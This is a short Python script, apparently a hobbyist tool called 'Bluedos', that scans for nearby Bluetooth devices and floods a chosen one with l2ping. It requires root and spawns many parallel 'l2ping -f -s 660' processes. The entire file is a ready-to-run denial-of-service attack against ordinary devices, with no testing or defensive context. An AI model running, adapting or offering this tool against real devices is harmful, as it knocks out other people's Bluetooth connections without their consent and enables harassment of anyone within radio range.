# Bluedos by @ceigh
from os import getuid
from subprocess import check_output, Popen


def confirm(question):
    while 1:
        reply = input(f"{question}: ").lower()[:1]
        if reply in 'y':  # 'yosjtdд' (international), using {in} to consider the enter
            return 1
        elif reply == 'n':
            return 0


def bye():
    from time import sleep
    print("\nBye!")
    sleep(1)
    print("\033c")


def get_devices():
    print("\033c")
    if len(check_output(['hcitool', 'dev'])[9:]):
        print("Scanning...\n")
        hcitool_out = check_output(['hcitool', 'scan']).decode()[13:-1]
        devices = [i.split('\t')[1:] for i in hcitool_out.split('\n') if len(hcitool_out) != 0]
        return devices
    else:
        exit("Enable Bluetooth first")


def attack(target):
    from threading import Thread

    def popen():
        for i in range(10):
            Popen(['l2ping', '-f', '-s', '660', target[0]])

    print(f"Attacking '{target[1]}'...\nTo stop type Ctrl+C")
    try:
        for j in range(10):
            Thread(target=popen).start()
    except KeyboardInterrupt:
        bye()


def main():
    devices = get_devices()
    dev_number = len(devices)
    if not dev_number:
        print("No devices around :(")
        if confirm("Scan again?"):
            main()
        else:
            bye()
    elif dev_number == 1:
        attack(devices[0])
    else:
        print("Several devices found:")
        for index, device in enumerate(devices):
            print(f"{index}) '{device[1]}' <{device[0]}>")
        while 1:
            try:
                target_i = int(input(f"Select a device (0-{dev_number - 1}): "))
            except ValueError:
                continue
            if target_i in range(dev_number):
                break
        attack(devices[target_i])


if __name__ == '__main__':
    if not getuid():
        main()
    else:
        exit("Run it as sudo")
